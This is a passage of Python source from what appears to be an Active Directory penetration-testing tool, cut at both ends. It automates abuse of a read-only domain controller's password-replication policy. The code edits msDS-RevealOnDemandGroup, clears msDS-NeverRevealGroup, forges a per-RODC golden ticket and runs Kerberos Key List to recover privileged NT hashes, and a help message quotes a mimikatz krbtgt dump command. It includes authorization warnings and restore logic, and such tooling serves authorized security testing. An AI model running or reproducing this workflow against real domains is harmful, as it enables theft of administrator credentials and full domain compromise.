        domain,
        targets=_build_rodc_target_candidates(domain, normalized_machine),
        required_ports=_RODC_REQUIRED_ACCESS_PORTS,
    )
    marked_machine = mark_sensitive(machine_account, "user")
    marked_domain = mark_sensitive(domain, "domain")
    if not resolution.report_available:
        print_warning(
            f"RODC follow-up for {marked_machine}@{marked_domain} requires a current-vantage reachability report first."
        )
        return None

    assessment = next(iter(resolution.reachable_targets), None)
    if assessment is None:
        print_warning(
            f"RODC follow-up is blocked because ADscan cannot currently reach the host for {marked_machine}@{marked_domain} on an admin-capable service."
        )
        unmatched = resolution.unmatched_targets
        unreachable = resolution.unreachable_targets
        if unmatched:
            maybe_offer_pivot_opportunity_for_host_viability(
                shell,
                domain=domain,
                blocked_target=normalized_machine,
                viability_status="enabled_but_unresolved",
                operator_summary=(
                    "The RODC host was not resolved in the current-vantage inventory. "
                    "Refresh network reachability before retrying."
                ),
            )
        elif unreachable:
            maybe_offer_pivot_opportunity_for_host_viability(
                shell,
                domain=domain,
                blocked_target=normalized_machine,
                viability_status="resolved_but_unreachable",
                operator_summary=(
                    "The RODC host resolved in the current-vantage inventory, but the expected "
                    "admin-capable ports are not reachable from the current vantage."
                ),
            )
        return None

    print_info_debug(
        "[rodc] current-vantage follow-up access confirmed: "
        f"target={mark_sensitive(_first_hostname_candidate(assessment, fallback_host=machine_account.rstrip('$')), 'hostname')} "
        f"ports={mark_sensitive(','.join(str(port) for port in assessment.open_ports), 'detail')}"
    )
    return assessment


def _resolve_object_dn(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
) -> str | None:
    """Resolve one object's distinguished name via BloodyAD."""
    result = service.acl.get_object_attributes(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_names=("distinguishedName",),
        kerberos=True,
    )
    if not result.success:
        return None
    return (
        str(
            result.attributes.get("distinguishedName")
            or result.attributes.get("distinguishedname")
            or ""
        ).strip()
        or None
    )


def _load_rodc_attribute_state(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
) -> tuple[str | None, tuple[str, ...], tuple[str, ...]]:
    """Return current RODC DN, RevealOnDemand values, and NeverReveal values."""
    result = service.acl.get_object_attributes(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_names=(
            "distinguishedName",
            "msDS-RevealOnDemandGroup",
            "msDS-NeverRevealGroup",
        ),
        kerberos=True,
    )
    if not result.success:
        return None, (), ()
    parsed = _parse_bloodyad_multi_value_output(result.raw_output or "")
    rodc_dn = (
        str(
            result.attributes.get("distinguishedName")
            or result.attributes.get("distinguishedname")
            or ""
        ).strip()
        or None
    )
    reveal_values = _normalize_rodc_prp_attribute_values(
        parsed, "msDS-RevealOnDemandGroup"
    )
    never_reveal_values = _normalize_rodc_prp_attribute_values(
        parsed, "msDS-NeverRevealGroup"
    )
    return rodc_dn, reveal_values, never_reveal_values


def _restore_rodc_attribute_state(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
    reveal_values: tuple[str, ...],
    never_reveal_values: tuple[str, ...],
) -> bool:
    """Restore the RODC password-replication attributes to their original state."""
    reveal_restore = service.acl.set_object_attribute_values(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_name="msDS-RevealOnDemandGroup",
        attribute_values=reveal_values,
        kerberos=True,
    )
    never_reveal_restore = service.acl.set_object_attribute_values(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_name="msDS-NeverRevealGroup",
        attribute_values=never_reveal_values,
        kerberos=True,
    )
    return bool(reveal_restore.success and never_reveal_restore.success)


def _format_rodc_restore_values(values: tuple[str, ...]) -> str:
    """Render original LDAP attribute values for operator-facing cleanup guidance."""
    if not values:
        return "(clear this attribute)"
    return "\n".join(f"- {mark_sensitive(value, 'path')}" for value in values)


def _print_rodc_cleanup_manual_guidance(
    *,
    domain: str,
    rodc_machine: str,
    reveal_values: tuple[str, ...],
    never_reveal_values: tuple[str, ...],
) -> None:
    """Show actionable manual cleanup guidance when automatic restore fails."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_rodc = mark_sensitive(rodc_machine, "user")
    print_warning(
        f"RODC follow-up cleanup did not complete. Review and restore the original password-replication attributes on {marked_rodc} in {marked_domain}."
    )
    print_panel(
        "\n".join(
            [
                "Automatic cleanup failed. Restore the RODC object manually to avoid leaving password-replication changes behind.",
                "",
                "Restore `msDS-RevealOnDemandGroup` to:",
                _format_rodc_restore_values(reveal_values),
                "",
                "Restore `msDS-NeverRevealGroup` to:",
                _format_rodc_restore_values(never_reveal_values),
            ]
        ),
        title="[bold yellow]Manual Cleanup Required[/bold yellow]",
        border_style="yellow",
        expand=False,
    )


def _print_rodc_followup_execution_plan(
    *,
    domain: str,
    rodc_machine: str,
    reachable_host: str,
    host_actor: str,
    ldap_actor_label: str,
    target_user: str,
    key_list_ready: bool,
    key_plan_username: str | None = None,
    rodc_number: int | None = None,
) -> None:
    """Explain the two-actor execution plan before changing RODC state."""
    lines = [
        f"RODC object: {mark_sensitive(rodc_machine, 'user')} in {mark_sensitive(domain, 'domain')}",
        f"LDAP policy actor: {mark_sensitive(ldap_actor_label, 'user')}",
        f"RODC host actor: {mark_sensitive(host_actor, 'user')}",
        f"Reachable host: {mark_sensitive(reachable_host, 'hostname')}",
        f"Target privileged principal: {mark_sensitive(target_user, 'user')}",
        "",
        "ADscan will temporarily update the RODC password-replication policy with the LDAP-capable principal, then restore the original attributes during cleanup.",
    ]
    if key_list_ready:
        lines.extend(
            [
                "",
                "PRP-active recovery plan:",
                "1. Keep the temporary PRP window open just long enough for credential recovery.",
                "2. Forge a fresh per-RODC golden ticket and use it immediately for Kerberos Key List.",
                "3. Store any recovered credential material before cleanup restores the original LDAP attributes.",
            ]
        )
        if key_plan_username:
            lines.append(
                "Stored per-RODC krbtgt material: "
                f"{mark_sensitive(key_plan_username, 'user')}"
                + (
                    f" (RODC #{mark_sensitive(str(rodc_number), 'detail')})"
                    if rodc_number is not None
                    else ""
                )
            )

    print_panel(
        "\n".join(lines),
        title="[bold blue]RODC Follow-up Plan[/bold blue]",
        border_style="blue",
        expand=False,
    )


def _print_rodc_prp_next_steps(
    *,
    host: str,
    target_user: str,
    cleanup_completed: bool,
) -> None:
    """Explain what PRP preparation did and which modern follow-up should run next."""
    prp_state_line = (
        "ADscan restored the original PRP attributes, so this was a safe validation of the write path rather than a persistent PRP change."
        if cleanup_completed
        else "ADscan could not confirm cleanup, so treat the RODC PRP attributes as still modified until manually verified."
    )
    print_panel(
        "\n".join(
            [
                f"PRP write path validated for {mark_sensitive(target_user, 'user')} on {mark_sensitive(host, 'hostname')}.",
                prp_state_line,
                "",
                "ADscan intentionally does not run the legacy generic LSA dump here.",
                "For the per-RODC krbtgt objective, use the RODC krbtgt extraction follow-up; it runs the targeted `lsadump::lsa /inject /name:krbtgt_<RID>` workflow.",
                "After AES material is available for the per-RODC krbtgt account, continue with the Kerberos Key List follow-up.",
            ]
        ),
        title="[bold green]RODC PRP Next Steps[/bold green]",
        border_style="green",
        expand=False,
    )


def _resolve_rodc_aes_key_from_workspace(
    shell: Any,
    *,
    domain: str,
    key_username: str,
) -> str:
    """Return stored AES material for a per-RODC krbtgt account."""
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    if not isinstance(domain_data, dict):
        return ""
    kerberos_keys = domain_data.get("kerberos_keys", {})
    if not isinstance(kerberos_keys, dict):
        return ""

    normalized_username = str(key_username or "").strip().casefold()
    for username, raw_material in kerberos_keys.items():
        if str(username or "").strip().casefold() != normalized_username:
            continue
        if not isinstance(raw_material, dict):
            return ""
        return str(raw_material.get("aes256") or raw_material.get("aes128") or "").strip()
    return ""


def _resolve_rodc_target_identity(
    shell: Any,
    *,
    domain: str,
    target_user: str,
) -> tuple[str | None, int | None]:
    """Return the domain SID and target RID required for RODC ticket forging."""
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    domain_sid = ""
    if isinstance(domain_data, dict):
        domain_sid = str(domain_data.get("domain_sid") or "").strip()

    user_sid = resolve_user_sid(shell, domain, target_user)
    if user_sid:
        parts = user_sid.split("-")
        if len(parts) >= 2 and parts[-1].isdigit():
            return domain_sid or "-".join(parts[:-1]), int(parts[-1])
    if str(target_user or "").strip().casefold() == "administrator":
        return domain_sid or None, 500
    return domain_sid or None, None


def _resolve_rodc_golden_ticket_output_dir(
    shell: Any,
    *,
    domain: str,
    rodc_number: int,
) -> Path:
    """Return the per-RODC forged-ticket artefact directory."""
    workspace_dir = Path(_resolve_workspace_dir(shell))
    domains_dir = str(getattr(shell, "domains_dir", "domains") or "domains").strip() or "domains"
    return (
        workspace_dir
        / domains_dir
        / domain
        / "kerberos"
        / "rodc_golden_tickets"
        / f"rodc_{int(rodc_number)}"
    )


def _forge_rodc_golden_ticket_for_prp_key_list(
    shell: Any,
    *,
    domain: str,
    rodc_machine: str,
    target_user: str,
    rodc_number: int,
    rodc_aes_key: str,
) -> str:
    """Forge a fresh RODC golden ticket for the PRP-active Key List transaction."""
    domain_sid, user_rid = _resolve_rodc_target_identity(
        shell,
        domain=domain,
        target_user=target_user,
    )
    if not domain_sid or user_rid is None:
        return ""

    output_dir = _resolve_rodc_golden_ticket_output_dir(
        shell,
        domain=domain,
        rodc_number=rodc_number,
    )
    outcome = RodcGoldenTicketForger().forge(
        RodcGoldenTicketRequest(
            domain=domain.upper(),
            domain_sid=domain_sid,
            target_username=target_user,
            rodc_number=rodc_number,
            output_dir=output_dir,
            krbtgt_aes256=rodc_aes_key,
            user_id=user_rid,
        )
    )
    if not outcome.success or not outcome.ccache_path:
        print_warning(
            "Kerberos Key List requires a forged RODC ticket, but ticket forging failed: "
            f"{mark_sensitive(outcome.error_message or 'unknown error', 'detail')}"
        )
        return ""

    RodcFollowupStateService().mark_golden_ticket_forged(
        shell,
        domain=domain,
        target_computer=rodc_machine,
        target_user=target_user,
        ticket_path=outcome.ccache_path,
    )
    return outcome.ccache_path


def _save_rodc_key_list_output(
    shell: Any,
    *,
    domain: str,
    rodc_number: int,
    target_user: str,
    output: str,
) -> str:
    """Persist raw Key List output in the workspace for later review."""
    workspace_dir = str(getattr(shell, "current_workspace_dir", "") or "").strip()
    if not workspace_dir:
        return ""
    domains_dir = str(getattr(shell, "domains_dir", "domains") or "domains").strip() or "domains"
    safe_user = target_user.replace("\\", "_").replace("/", "_").replace(":", "_")
    path = (
        Path(workspace_dir)
        / domains_dir
        / domain
        / "kerberos"
        / "key_list"
        / f"rodc_{rodc_number}_{safe_user}.txt"
    )
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(output, encoding="utf-8")
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_info_debug(
            "[rodc] failed to save Kerberos Key List output: "
            f"{mark_sensitive(str(exc), 'detail')}"
        )
        return ""
    return str(path)


def _print_rodc_prp_key_list_transaction_plan(
    *,
    domain: str,
    target_user: str,
    kdc_host: str,
    key_username: str,
    rodc_number: int,
) -> None:
    """Explain the forged-ticket transaction ADscan is about to run while PRP is active."""
    print_panel(
        "\n".join(
            [
                f"Domain: {mark_sensitive(domain, 'domain')}",
                f"Target privileged principal: {mark_sensitive(target_user, 'user')}",
                f"KDC host: {mark_sensitive(kdc_host, 'hostname')}",
                "Per-RODC krbtgt material: "
                f"{mark_sensitive(key_username, 'user')} "
                f"(RODC #{mark_sensitive(str(rodc_number), 'detail')})",
                "",
                "ADscan will now:",
                "1. Forge a fresh per-RODC golden ticket for the selected user.",
                "2. Use that forged ticket immediately for a Kerberos Key List request while PRP is still active.",
                "3. Parse and store any recovered credential material before cleanup restores the original LDAP state.",
            ]
        ),
        title="[bold blue]RODC Key List Transaction[/bold blue]",
        border_style="blue",
        expand=False,
    )


def _maybe_run_rodc_key_list_after_prp(
    shell: Any,
    *,
    domain: str,
    rodc_machine: str,
    target_user: str,
    kdc_host: str,
) -> bool:
    """Run Key List while the PRP change is still active, when AES material exists."""
    key_plan = resolve_rodc_krbtgt_key_plan(
        shell,
        domain=domain,
        target_computer=rodc_machine,
    )
    if key_plan is None:
        print_info(
            "PRP is prepared, but ADscan has no stored per-RODC krbtgt material yet. "
            "Run the RODC krbtgt extraction follow-up first."
        )
        return False

    rodc_aes_key = _resolve_rodc_aes_key_from_workspace(
        shell,
        domain=domain,
        key_username=key_plan.username,
    )
    if not rodc_aes_key:
        print_warning(
            "PRP is prepared, but ADscan cannot complete the cache-to-credential step because "
            "the stored per-RODC krbtgt material only contains NT/RC4. Kerberos Key List requires AES128/AES256."
        )
        return False

    rodc_number = int(key_plan.rid)
    print_info_debug(
        "[rodc] prp-active Kerberos Key List is ready: "
        f"target={mark_sensitive(target_user, 'user')} "
        f"rodc_key={mark_sensitive(key_plan.username, 'user')} "
        f"rodc_number={mark_sensitive(str(rodc_number), 'detail')} "
        f"kdc={mark_sensitive(kdc_host, 'hostname')}"
    )
    _print_rodc_prp_key_list_transaction_plan(
        domain=domain,
        target_user=target_user,
        kdc_host=kdc_host,
        key_username=key_plan.username,
        rodc_number=rodc_number,
    )

    if not getattr(shell, "auto", False) and not Confirm.ask(
        "Forge the per-RODC golden ticket and run Kerberos Key List now for "
        f"{mark_sensitive(target_user, 'user')} while PRP is active?",
        default=True,
    ):
        print_info("Skipping Kerberos Key List by user choice.")
        return False

    ticket_path = _forge_rodc_golden_ticket_for_prp_key_list(
        shell,
        domain=domain,
        rodc_machine=rodc_machine,
        target_user=target_user,
        rodc_number=rodc_number,
        rodc_aes_key=rodc_aes_key,
    )
    if not ticket_path:
        print_warning(
            "Kerberos Key List was not attempted because ADscan could not prepare "
            "a forged RODC ticket for the selected account."
        )
        return False

    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    dc_ip = ""
    if isinstance(domain_data, dict):
        dc_ip = str(domain_data.get("dc_ip") or "").strip()
    request = KerberosKeyListRequest(
        domain=domain,
        kdc_host=kdc_host,
        rodc_number=rodc_number,
        rodc_aes_key=rodc_aes_key,
        targets=(target_user,),
        ccache_path=ticket_path,
        use_kerberos=True,
        dc_ip=dc_ip or None,
        impacket_scripts_dir=str(getattr(shell, "impacket_scripts_dir", "") or "").strip()
        or None,
    )

    with active_step_followup(
        shell,
        source="rodc_prp_transaction",
        title="Run Kerberos Key List",
    ):
        outcome = KerberosKeyListService().run(
            request,
            run_command=getattr(shell, "run_command", None),
        )

    if outcome.raw_output:
        output_path = _save_rodc_key_list_output(
            shell,
            domain=domain,
            rodc_number=rodc_number,
            target_user=target_user,
            output=outcome.raw_output,
        )
        if output_path:
            print_info(
                f"Kerberos Key List output saved to {mark_sensitive(output_path, 'path')}."
            )
    if not outcome.success:
        print_warning(
            "Kerberos Key List did not recover credentials while PRP was active: "
            f"{mark_sensitive(outcome.error_message or 'unknown error', 'detail')}"
        )
        return False

    for credential in outcome.credentials:
        add_credential = getattr(shell, "add_credential", None)
        if callable(add_credential):
            add_credential(
                credential.domain.lower(),
                credential.username,
                credential.nt_hash,
            )

    recovered = ", ".join(
        mark_sensitive(item.username, "user") for item in outcome.credentials
    )
    RodcFollowupStateService().mark_key_list_completed(
        shell,
        domain=domain,
        target_computer=rodc_machine,
        target_user=target_user,
    )
    print_success(
        f"Kerberos Key List recovered NTLM material for {recovered} while PRP was active."
    )
    return True


def _build_rodc_prp_tracking_context(
    *,
    domain: str,
    rodc_machine: str,
    selected_policy_actor: dict[str, Any],
    policy_actor_label: str,
) -> tuple[str, str, dict[str, object]]:
    """Return tracking labels/notes for the real PRP-modification action.

    The graph capability edge may originate from a delegated group rather than the
    concrete LDAP actor used to touch the directory. Prefer the terminal
    ``ManageRODCPrp`` step labels from the selected sample path when available,
    then fall back to the LDAP actor label.
    """
    sample_path = (
        selected_policy_actor.get("sample_path")
        if isinstance(selected_policy_actor, dict)
        else None
    )
    from_label = str(policy_actor_label or "").strip()
    to_label = f"{normalize_machine_account(rodc_machine)}@{domain}".upper()
    if isinstance(sample_path, dict):
        steps = sample_path.get("steps")
        if isinstance(steps, list):
            for step in reversed(steps):
                if not isinstance(step, dict):
                    continue
                if str(step.get("action") or "").strip().lower() != "managerodcprp":
                    continue
                details = (
                    step.get("details") if isinstance(step.get("details"), dict) else {}
                )
                candidate_from = str(details.get("from") or "").strip()
                candidate_to = str(details.get("to") or "").strip()
                if candidate_from:
                    from_label = candidate_from
                if candidate_to:
                    to_label = candidate_to
                break
        if not to_label:
            candidate_target = str(sample_path.get("target") or "").strip()
            if candidate_target:
                to_label = candidate_target

    notes: dict[str, object] = {
        "ldap_actor": policy_actor_label,
        "rodc_machine": normalize_machine_account(rodc_machine),
        "tracking_relation": "ManageRODCPrp",
    }
    return from_label, to_label, notes


def offer_rodc_escalation(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    rodc_machine: str | None = None,
) -> bool:
    """Prepare password replication abuse for one RODC using a host-access actor."""
    cleanup_required = False
    cleanup_completed = False
    cleanup_scope_id = begin_cleanup_scope(
        shell,
        label="rodc_followup",
        domain=domain,
    )
    original_reveal_values: tuple[str, ...] = ()
    original_never_reveal_values: tuple[str, ...] = ()
    service: ExploitationService | None = None
    pdc_host = ""
    bloody_path = ""
    normalized_machine = normalize_machine_account(rodc_machine or username)
    policy_username = username
    policy_password = password
    policy_actor_label = username
    assessment: CurrentVantageTargetAssessment | None = None
    target_user = ""
    try:
        if getattr(shell, "get_user_dc_role", None) is not None:
            dc_role = shell.get_user_dc_role(domain, normalized_machine)
            if dc_role != "rodc":
                print_warning(
                    f"{mark_sensitive(normalized_machine, 'user')} is not classified as a Read-Only Domain Controller in {mark_sensitive(domain, 'domain')}."
                )
                return False

        assessment = _assess_rodc_host_followup_access(
            shell,
            domain=domain,
            machine_account=normalized_machine,
        )
        if assessment is None:
            return False

        _refresh_rodc_prp_control_edges(shell, domain=domain)
        object_control = _assess_rodc_object_control(
            shell,
            domain=domain,
            machine_account=normalized_machine,
            actor_username=username,
        )
        print_info_debug(
            "[rodc] object-control assessment: "
            f"ready={bool(object_control.get('ready'))} "
            f"reason={mark_sensitive(str(object_control.get('reason') or 'unknown'), 'detail')} "
            f"candidate_paths={len(list(object_control.get('candidate_paths') or []))} "
            f"candidates={len(list(object_control.get('candidates') or []))} "
            f"current_actor_ready={bool(object_control.get('current_actor_ready'))} "
            f"auto={bool(getattr(shell, 'auto', False))} "
            f"target={mark_sensitive(str(object_control.get('target_label') or normalized_machine), 'user')}"
        )
        if bool(object_control.get("ready")):
            print_info_debug(
                "[rodc] existing prerequisite already satisfied; skipping prerequisite-path executor: "
                f"target={mark_sensitive(str(object_control.get('target_label') or normalized_machine), 'user')}"
            )
        object_control = _maybe_execute_rodc_object_control_prerequisites(
            shell,
            domain=domain,
            machine_account=normalized_machine,
            actor_username=username,
            object_control=object_control,
        )
        object_control = _maybe_select_ready_rodc_object_control_path(
            shell,
            domain=domain,
            machine_account=normalized_machine,
            actor_username=username,
            object_control=object_control,
        )
        print_info_debug(
            "[rodc] object-control after ready-path selection: "
            f"ready={bool(object_control.get('ready'))} "
            f"reason={mark_sensitive(str(object_control.get('reason') or 'unknown'), 'detail')} "
            f"candidate_paths={len(list(object_control.get('candidate_paths') or []))} "
            f"candidates={len(list(object_control.get('candidates') or []))} "
            f"current_actor_ready={bool(object_control.get('current_actor_ready'))}"
        )
        if not bool(object_control.get("ready")):
            _print_rodc_object_control_guidance(
                domain=domain,
                target_label=str(
                    object_control.get("target_label") or normalized_machine
                ),
                actor_username=username,
                reason=str(object_control.get("reason") or "unknown"),
                candidates=list(object_control.get("candidates") or []),
            )
            return False

        policy_actor = _select_rodc_policy_actor(
            shell,
            domain=domain,
            current_actor=username,
            candidates=list(object_control.get("candidates") or []),
        )
        selected_policy_actor = policy_actor.get("selected")
        if not isinstance(selected_policy_actor, dict):
            _print_rodc_object_control_guidance(
                domain=domain,
                target_label=str(
                    object_control.get("target_label") or normalized_machine
                ),
                actor_username=username,
                reason=str(policy_actor.get("reason") or "unknown"),
                candidates=list(policy_actor.get("candidates") or []),
            )
            return False

        policy_username = (
            str(
                selected_policy_actor.get("credential_username")
                or selected_policy_actor.get("username")
                or username
            ).strip()
            or username
        )
        policy_password = str(
            selected_policy_actor.get("credential_secret") or ""
        ).strip()
        policy_actor_label = (
            str(
                selected_policy_actor.get("label")
                or selected_policy_actor.get("username")
                or policy_username
            ).strip()
            or policy_username
        )
        tracking_from_label, tracking_to_label, tracking_notes = (
            _build_rodc_prp_tracking_context(
                domain=domain,
                rodc_machine=normalized_machine,
                selected_policy_actor=selected_policy_actor,
                policy_actor_label=policy_actor_label,
            )
        )

        domain_data = getattr(shell, "domains_data", {}).get(domain, {})
        pdc_host = str(
            domain_data.get("pdc_hostname_fqdn")
            or domain_data.get("pdc_hostname")
            or domain_data.get("pdc")
            or ""
        ).strip()
        bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
        if not pdc_host or not bloody_path:
            print_error("RODC follow-up requires a reachable DC and bloodyAD.")
            return False

        default_target_user = str(
            domain_data.get("rodc_followup_default_user") or "Administrator"
        ).strip()
        print_operation_header(
            "RODC Follow-up",
            details={
                "Domain": domain,
                "RODC": normalized_machine,
                "Reachable Host": _first_hostname_candidate(
                    assessment,
                    fallback_host=normalized_machine.rstrip("$"),
                ),
                "LDAP Actor": policy_actor_label,
                "Host Actor": username,
            },
            icon="🧱",
        )
        if not getattr(shell, "auto", False):
            print_system_change_warning(
                title="[bold yellow]RODC Follow-up Warning[/bold yellow]",
                summary=(
                    "This follow-up changes the RODC object's password-replication policy in Active Directory. "
                    "ADscan will update LDAP attributes on the RODC object before attempting the follow-up."
                ),
                planned_changes=[
                    "Add the selected privileged account and the Allowed RODC Password Replication Group to msDS-RevealOnDemandGroup.",
                    "Temporarily clear msDS-NeverRevealGroup so group-based deny entries cannot block the selected account.",
                ],
                impact_notes=[
                    "This can allow privileged credentials to be replicated or cached on the RODC.",
                    f"ADscan will use {policy_actor_label} for the LDAP policy phase.",
                    "ADscan will not run the legacy generic LSA dump from this PRP step.",
                    "ADscan will try to restore the original LDAP attribute values during cleanup.",
                ],
                cleanup_notes=[
                    "Cleanup restores the directory settings, but it may not undo credential material already cached on the RODC.",
                ],
                authorization_note=(
                    "Only continue if you are explicitly authorized to make temporary AD changes in this environment."
                ),
            )
            if not Confirm.ask(
                "Proceed with the RODC follow-up now?",
                default=False,
            ):
                print_info("Skipping RODC follow-up by user choice.")
                return False

        if getattr(shell, "auto", False):
            target_user = default_target_user
        else:
            selected_target_user = resolve_privileged_target_user(
                shell,
                domain=domain,
                purpose="RODC credential caching",
                require_domain_admin=True,
                exclude_not_delegated=False,
                exclude_protected_users=False,
            )
            if not selected_target_user:
                print_info("Skipping RODC follow-up by user choice.")
                return False
            target_user = selected_target_user
        preferred_host = _first_hostname_candidate(
            assessment,
            fallback_host=normalized_machine.rstrip("$"),
        )
        key_plan = resolve_rodc_krbtgt_key_plan(
            shell,
            domain=domain,
            target_computer=normalized_machine,
        )
        key_list_ready = False
        key_plan_username: str | None = None
        rodc_number: int | None = None
        if key_plan is not None:
            key_plan_username = str(key_plan.username or "").strip() or None
            rodc_number = int(key_plan.rid)
            key_list_ready = bool(
                _resolve_rodc_aes_key_from_workspace(
                    shell,
                    domain=domain,
                    key_username=key_plan.username,
                )
            )
        _print_rodc_followup_execution_plan(
            domain=domain,
            rodc_machine=normalized_machine,
            reachable_host=preferred_host,
            host_actor=username,
            ldap_actor_label=policy_actor_label,
            target_user=target_user,
            key_list_ready=key_list_ready,
            key_plan_username=key_plan_username,
            rodc_number=rodc_number,
        )

        service = ExploitationService()
        target_user_dn = _resolve_object_dn(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=policy_username,
            password=policy_password,
            target_object=target_user,
        )
        if not target_user_dn:
            print_error(
                f"Could not resolve Distinguished Name for {mark_sensitive(target_user, 'user')}."
            )
            return False

        allowed_group_dn = _resolve_object_dn(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=policy_username,
            password=policy_password,
            target_object=_RODC_ALLOWED_GROUP,
        )
        if not allowed_group_dn:
            allowed_group_dn = (
                f"CN={_RODC_ALLOWED_GROUP},CN=Users,{derive_base_dn(domain)}"
            )
            print_info_debug(
                "[rodc] Falling back to canonical DN for Allowed RODC Password Replication Group: "
                f"{mark_sensitive(allowed_group_dn, 'path')}"
            )

        rodc_dn, reveal_values, never_reveal_values = _load_rodc_attribute_state(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=policy_username,
            password=policy_password,
            target_object=normalized_machine,
        )
        if not rodc_dn:
            print_error(
                f"Could not read the RODC object state for {mark_sensitive(normalized_machine, 'user')}."
            )
            return False
        original_reveal_values = tuple(reveal_values)
        original_never_reveal_values = tuple(never_reveal_values)

        updated_reveal_values = _normalize_attr_values(
            [*reveal_values, allowed_group_dn, target_user_dn]
        )
        cleared_never_reveal = False
        with active_step(
            shell,
            domain=domain,
            from_label=tracking_from_label,
            relation="ManageRODCPrp",
            to_label=tracking_to_label,
            notes=tracking_notes,
        ):
            update_active_step_status(
                shell,
                domain=domain,
                status="attempted",
                notes={
                    **tracking_notes,
                    "target_user": target_user,
                    "target_user_dn": target_user_dn,
                    "rodc_dn": rodc_dn,
                    "attribute_name": "msDS-RevealOnDemandGroup",
                    "attribute_values": updated_reveal_values,
                },
            )
            reveal_update = service.acl.set_object_attribute_values(
                pdc_host=pdc_host,
                bloody_path=bloody_path,
                domain=domain,
                username=policy_username,
                password=policy_password,
                target_object=normalized_machine,
                attribute_name="msDS-RevealOnDemandGroup",
                attribute_values=updated_reveal_values,
                kerberos=True,
            )
            if not reveal_update.success:
                update_active_step_status(
                    shell,
                    domain=domain,
                    status="failed",
                    notes={
                        **tracking_notes,
                        "target_user": target_user,
                        "target_user_dn": target_user_dn,
                        "rodc_dn": rodc_dn,
                        "failed_attribute": "msDS-RevealOnDemandGroup",
                    },
                )
                print_error(
                    "Failed to update msDS-RevealOnDemandGroup on the RODC object."
                )
                return False
            cleanup_required = True

            if never_reveal_values:
                never_reveal_update = service.acl.set_object_attribute_values(
                    pdc_host=pdc_host,
                    bloody_path=bloody_path,
                    domain=domain,
                    username=policy_username,
                    password=policy_password,
                    target_object=normalized_machine,
                    attribute_name="msDS-NeverRevealGroup",
                    attribute_values=(),
                    kerberos=True,
                )
                if not never_reveal_update.success:
                    update_active_step_status(
                        shell,
                        domain=domain,
                        status="failed",
                        notes={
                            **tracking_notes,
                            "target_user": target_user,
                            "target_user_dn": target_user_dn,
                            "rodc_dn": rodc_dn,
                            "failed_attribute": "msDS-NeverRevealGroup",
                        },
                    )
                    print_error(
                        "Failed to update msDS-NeverRevealGroup on the RODC object."
                    )
                    return False
                cleared_never_reveal = True

            update_active_step_status(
                shell,
                domain=domain,
                status="success",
                notes={
                    **tracking_notes,
                    "target_user": target_user,
                    "target_user_dn": target_user_dn,
                    "rodc_dn": rodc_dn,
                    "updated_attributes": (
                        ("msDS-RevealOnDemandGroup", "msDS-NeverRevealGroup")
                        if cleared_never_reveal
                        else ("msDS-RevealOnDemandGroup",)
                    ),
                    "never_reveal_action": "cleared_temporarily"
                    if cleared_never_reveal
                    else "unchanged_empty",
                },
            )

        marked_target_user = mark_sensitive(target_user, "user")
        marked_rodc = mark_sensitive(normalized_machine, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_success(
            f"RODC follow-up prepared password replication for {marked_target_user} on {marked_rodc} in {marked_domain} using {mark_sensitive(policy_actor_label, 'user')}."
        )
        RodcFollowupStateService().mark_prp_prepared(
            shell,
            domain=domain,
            target_computer=normalized_machine,
            target_user=target_user,
        )
        summary_lines = [
            f"RODC object DN: {mark_sensitive(rodc_dn, 'path')}",
            f"Target account DN: {mark_sensitive(target_user_dn, 'path')}",
            f"LDAP policy actor: {mark_sensitive(policy_actor_label, 'user')}",
            f"RODC host actor: {mark_sensitive(username, 'user')}",
            "Updated attribute: msDS-RevealOnDemandGroup",
        ]
        if cleared_never_reveal:
            summary_lines.append(
                "Updated attribute: msDS-NeverRevealGroup (temporarily cleared; restored during cleanup)"
            )
        print_panel(
            "\n".join(summary_lines),
            title="[bold green]RODC Follow-up Applied[/bold green]",
            border_style="green",
            expand=False,
        )
        _maybe_run_rodc_key_list_after_prp(
            shell,
            domain=domain,
            rodc_machine=normalized_machine,
            target_user=target_user,
            kdc_host=pdc_host,
        )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("RODC follow-up encountered an error.")
        print_info_debug(f"[rodc] escalation helper failed: {exc}")
        return False
    finally:
        if cleanup_required and service is not None and pdc_host and bloody_path:
            cleanup_completed = _restore_rodc_attribute_state(
                service,
                pdc_host=pdc_host,
                bloody_path=bloody_path,
                domain=domain,
                username=policy_username,
                password=policy_password,
                target_object=normalized_machine,
                reveal_values=original_reveal_values,
                never_reveal_values=original_never_reveal_values,
            )
            marked_rodc = mark_sensitive(normalized_machine, "user")
            marked_domain = mark_sensitive(domain, "domain")
            if cleanup_completed:
                RodcFollowupStateService().mark_prp_restored(
                    shell,
                    domain=domain,
                    target_computer=normalized_machine,
                    target_user=target_user,
                )
                print_info(
                    f"RODC follow-up cleanup completed: restored the original password-replication attributes on {marked_rodc} in {marked_domain}."
                )
                try:
                    _print_rodc_prp_next_steps(
                        host=_first_hostname_candidate(
                            assessment,
